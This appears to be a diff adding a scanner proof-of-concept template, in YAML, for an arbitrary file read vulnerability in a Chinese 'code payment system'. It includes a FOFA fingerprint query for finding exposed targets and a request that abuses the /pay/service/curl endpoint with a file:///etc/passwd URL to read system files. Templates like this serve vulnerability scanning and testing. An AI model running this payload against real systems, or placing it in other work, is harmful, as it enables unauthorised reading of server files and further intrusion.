@@ -1,0 +1,18 @@
+id: poc-yaml-code-payment-system-curl-anyfile-read
+info:
+  name: 码支付系统 curl 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 码支付系统
+  fofa: body="/epaydoc/epaydoc.php" && body="/sdk"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"码支付")
+- method: GET
+  path: /pay/service/curl?url=file:///etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+variables: {}
+transport: http
